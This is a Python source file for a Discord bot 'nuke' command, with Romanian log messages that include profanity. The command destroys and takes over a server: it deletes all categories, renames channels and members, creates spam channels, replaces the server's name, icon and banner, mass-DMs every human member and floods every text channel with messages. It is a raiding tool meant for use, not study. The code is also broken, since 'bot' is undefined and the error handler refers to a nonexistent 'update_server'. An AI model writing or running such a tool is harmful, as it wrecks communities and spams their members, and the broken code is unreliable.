import discord
import json
import asyncio
from discord.ext import commands

with open('nuke.json', 'r') as f:
    data = json.load(f)

num_new_channels = int(data.get('nchannelnew', 7))

class culori:
    gata = "\033[92m"
    eroare = "\033[91m"
    mata = "\033[0m"

@bot.command("nuke")
@commands.has_permissions(administrator=True)
async def n(ctx):
    guild = ctx.guild

    if num_new_channels < 7 or num_new_channels > 90:
        print(f'{culori.eroare}ce pula mea ai pus {num_new_channels} canale? baga cv intre 7 si 90{culori.mata}')
        await ctx.send('alege intre 7 si 90 canale in morti mati')
        return

    for category in guild.categories:
        try:
            await category.delete()
            print(f'{culori.gata}vezi ca am sters categoria {category.name}{culori.mata}')
        except Exception as e:
            print(f'{culori.eroare}vezi ca am eroare nu pot sa sterg categoria {category.name}: {str(e)}{culori.mata}')

    for i, channel in enumerate(guild.channels):
        try:
            if isinstance(channel, discord.TextChannel):
                new_name = data['channelnames'][i % len(data['channelnames'])]
                await channel.edit(name=new_name)
                print(f'{culori.gata}am dat rename la un canal cu {new_name}{culori.mata}')
            elif isinstance(channel, discord.VoiceChannel):
                new_name = data['channelnames'][i % len(data['channelnames'])]
                await channel.edit(name=new_name)
                print(f'{culori.gata}am dat rename la un canal de vc cu {new_name}{culori.mata}')
        except Exception as e:
            print(f'{culori.eroare}vezi ca am eroare si nu pot da rename la {channel.name}: {str(e)}{culori.mata}')

    for i in range(num_new_channels):
        new_channel_name = f"muieee {i + 1}"
        try:
            await guild.create_text_channel(new_channel_name)
            print(f'{culori.gata}am fct {new_channel_name}{culori.mata}')
        except Exception as e:
            print(f'{culori.eroare}vezi ca am eroare si nu pot face canalu {new_channel_name}: {str(e)}{culori.mata}')

    print(f'{culori.gata}toate canalele facute {num_new_channels}{culori.mata}')

    try:
        await guild.edit(name=data['nameserver'])
        print(f'{culori.gata}gt am schimbat numele la sv cu {data["nameserver"]}{culori.mata}')
    except Exception as e:
        print(f'{culori.eroare}vezi ca am eroare si nu pot sa schimb numele la sv {str(e)}{culori.mata}')

    if 'iconlink' in data and data['iconlink']:
        try:
            await guild.edit(icon=data['iconlink'])
            print(f'{culori.gata}am schimbat poza la sv{culori.mata}')
        except Exception as e:
            print(f'{culori.eroare}vezi ca am eroare si nu pot sa schimb poza la sv: {str(e)}{culori.mata}')

    if 'bannerlink' in data and data['bannerlink']:
        try:
            await guild.edit(banner=data['bannerlink'])
            print(f'{culori.gata}am scimbat benaru la sv {culori.mata}')
        except Exception as e:
            print(f'{culori.eroare}vezi ca am eroare si nu pot sa schimb baneru la sv: {str(e)}{culori.mata}')

    for member in guild.members:
        if not member.bot: 
            for message in data['dmmessages']:
                try:
                    await member.send(message)
                    print(f'{culori.gata}am dat la acest sklav {member.name} mesaju {message}{culori.mata}')
                    await asyncio.sleep(0)
                except Exception as e:
                    print(f'{culori.eroare}vezi ca am eroare in mm si nu pot trimitre mesaj pt {member.name}: {str(e)}{culori.mata}')

    for member in guild.members:
        try:
            await member.edit(nick=data['membernames'])
            print(f'{culori.gata}am dat rename la {member.name} cu: {data["membernames"]}{culori.mata}')
        except Exception as e:
            print(f'{culori.eroare}vezi ca am eroare si nu pot sa schimb numele lu {member.name}: {str(e)}{culori.mata}')

    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            for message in data['channelmsg']:
                try:
                    await channel.send(message)
                    print(f'{culori.gata}am dat mesaj pe {channel.name} cu {message}{culori.mata}')
                    await asyncio.sleep(0)
                except Exception as e:
                    print(f'{culori.eroare}vezi ca am eroare si nu pot sa dau mesaj pe {channel.name}: {str(e)}{culori.mata}')

@update_server.error
async def update_server_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("nono")
